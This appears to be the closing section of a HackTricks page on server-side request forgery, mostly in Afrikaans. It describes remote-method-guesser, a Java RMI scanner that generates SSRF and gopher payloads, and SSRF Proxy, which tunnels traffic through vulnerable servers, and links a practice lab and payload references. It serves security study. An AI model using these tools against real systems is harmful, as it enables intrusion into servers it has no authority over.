### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ is 'n _Java RMI_ kwetsbaarheidsskandeerder wat aanvaloperasies vir die meeste algemene _Java RMI_ kwesbaarhede ondersteun. Die meeste beskikbare operasies ondersteun die `--ssrf` opsie om 'n _SSRF_ payload vir die versoekte operasie te genereer. Saam met die `--gopher` opsie kan kant-en-klare _gopher_ payloads direk gegenereer word.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy is 'n multi-threaded HTTP-proxy bediener ontwerp om kliënt HTTP-verkeer deur HTTP-bedieners wat kwesbaar is vir Server-Side Request Forgery (SSRF) te tunnel.

### To practice


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Verwysings

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [Tenable – SSRF Vulnerability in Java TLS Handshakes That Creates DoS Risk](https://www.tenable.com/blog/tenable-discovers-ssrf-vulnerability-in-java-tls-handshakes-that-creates-dos-risk)
- [RFC 5280 §4.2.2.1 Authority Information Access](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.2.1)

{{#include ../../banners/hacktricks-training.md}}
